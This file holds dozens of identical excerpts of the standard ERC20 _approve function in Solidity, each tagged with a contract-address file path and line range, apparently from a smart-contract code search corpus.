<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="98" endline="107" pcid="1188">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="98" endline="107" pcid="1420">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2873e31F73f0dA96832ddcD0EB70006d6b17D228.sol" startline="100" endline="109" pcid="1249">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="97" endline="106" pcid="7611">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="97" endline="106" pcid="5438">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe0284b1a69321af02b565365Eae1a7Be844C94DB.sol" startline="95" endline="104" pcid="8039">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="100" endline="109" pcid="824">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xeC7593A6254CE83FA3545B1F44EcDf6C6b85848b.sol" startline="95" endline="104" pcid="8619">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="98" endline="107" pcid="523">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x938f386ac6101Dd112e656EdDc27C8bF32c85165.sol" startline="97" endline="106" pcid="5378">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="101" endline="110" pcid="7865">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="100" endline="109" pcid="1889">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="100" endline="109" pcid="6648">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe33c37cddb31548856537434d103e57d99242efb.sol" startline="99" endline="108" pcid="8219">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="96" endline="105" pcid="3889">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="189" endline="198" pcid="3946">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2e146811a317ba5Eb77209C942b186f67a65E801.sol" startline="100" endline="109" pcid="1375">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="97" endline="106" pcid="4322">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="99" endline="108" pcid="5323">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6dA4a2CFACDf730B214Ac74CD0e39CE8a353aC65.sol" startline="95" endline="104" pcid="4036">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="96" endline="105" pcid="4066">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="98" endline="107" pcid="1226">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="100" endline="109" pcid="2100">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xF6d9Db3461567c11929e641c6beb075213efEc9d.sol" startline="100" endline="109" pcid="9026">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x879ef12F70c31BfB91b7Fd74f74C71bb132D8e3a.sol" startline="94" endline="103" pcid="5037">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="100" endline="109" pcid="1568">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="100" endline="109" pcid="7596">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="97" endline="106" pcid="5423">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="95" endline="104" pcid="6354">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="96" endline="105" pcid="5724">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="99" endline="108" pcid="4611">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="97" endline="106" pcid="282">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="716" endline="725" pcid="6830">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="97" endline="106" pcid="5664">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="95" endline="104" pcid="901">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe542Cc82fcd14a249D0Bc3835ef4e3730616b190.sol" startline="102" endline="111" pcid="8294">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="96" endline="105" pcid="8787">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="97" endline="106" pcid="1553">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xea53c94ea7862c92d0f084d24551fe4f23beb463.sol" startline="96" endline="105" pcid="8489">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="97" endline="106" pcid="3779">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xeE35812e1254Da3Bd81eA1ba4275f2001085d671.sol" startline="96" endline="105" pcid="8697">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="96" endline="105" pcid="8817">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x73095365CF296E26D912E095C38FAc6b3fFAD3AF.sol" startline="100" endline="109" pcid="4230">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="110" endline="119" pcid="7733">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x033B28BE598a95363830624C0601E58AB03e9922.sol" startline="99" endline="108" pcid="130">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8af00a1f259F6183e35A21F47a3087489eECBF86.sol" startline="100" endline="109" pcid="5151">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1f3adE6D938122006C0Dc9fb893d767080123917.sol" startline="93" endline="102" pcid="980">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1b6B980b58C60aB35EeE3894Fc225E711B20f472.sol" startline="99" endline="108" pcid="864">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="98" endline="107" pcid="6284">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="97" endline="106" pcid="3931">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2E28a09452b865B719676E3629Fd002222D1111A.sol" startline="100" endline="109" pcid="1390">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="100" endline="109" pcid="8309">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x084C028E04F9C7aa04b2CeE80edE5DA2Fa3bbaF2.sol" startline="97" endline="106" pcid="217">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="97" endline="106" pcid="5709">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x249f6849814bfaeda890588e404030eccdefb1c6.sol" startline="97" endline="106" pcid="1136">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="99" endline="108" pcid="6783">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x887503fb56fDD4b0C97dD5ad5f01EACc4847E682.sol" startline="98" endline="107" pcid="5052">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x78102a37f04eb263c1f626702f1c1f98618ea3de.sol" startline="199" endline="208" pcid="4512">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="103" endline="112" pcid="408">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="97" endline="106" pcid="6384">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="96" endline="105" pcid="8459">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x6FB11C60e84916968b4c70ca80889BD13fbEDA9b.sol" startline="99" endline="108" pcid="4082">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="99" endline="108" pcid="232">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xafC5AE8b1149E8b488Ef254c4Ee4FcfA4c3eE124.sol" startline="98" endline="107" pcid="6431">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x707dAb814AAE29c506EAfc8036b64066FC403444.sol" startline="96" endline="105" pcid="4138">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="100" endline="109" pcid="879">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="96" endline="105" pcid="7656">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="98" endline="107" pcid="5221">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="97" endline="106" pcid="669">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7e1bcb000d4c5ced0a5eabe44c871b5206213a4f.sol" startline="100" endline="109" pcid="4680">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x0D6a0b9A0989D9126953C5a4aE4aA5300f6535f1.sol" startline="96" endline="105" pcid="365">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="96" endline="105" pcid="5503">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="95" endline="104" pcid="8399">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="96" endline="105" pcid="6586">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="100" endline="109" pcid="8916">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xaa268b4717907181f8826e1e5bC6ffC4BA3da5A0.sol" startline="93" endline="102" pcid="6189">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x7Fc773d80e0C788c7Ed212d0e86f2CB6a61E9bB3.sol" startline="100" endline="109" pcid="4711">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="97" endline="106" pcid="7934">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="98" endline="107" pcid="71">
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
